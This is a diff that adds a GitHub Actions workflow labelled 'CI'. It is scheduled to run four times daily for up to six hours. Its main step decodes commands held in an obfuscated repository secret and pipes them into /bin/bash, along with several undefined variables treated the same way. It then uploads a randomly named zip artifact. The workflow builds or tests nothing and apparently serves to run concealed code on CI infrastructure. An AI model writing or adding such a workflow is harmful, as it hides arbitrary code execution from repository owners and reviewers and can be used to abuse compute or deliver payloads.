@@ -1,0 +1,40 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '9 3,9,15,21 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          az01782: ${{ secrets.az01782 }}
+        run: |
+          printf '%s' "$az01782" | jq -r .rds1 | /bin/bash
+          printf '%s' "$agt3998" | jq -r .lsyce62385 | /bin/bash
+          echo $vute137 | jq -r .oqm3666 | /bin/bash
+          echo $lq0 | jq -r .dgkrm860 | /bin/bash
+
+      - name: Upload results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: V16wAjxj
+          path: "*.zip"
+          retention-days: 1
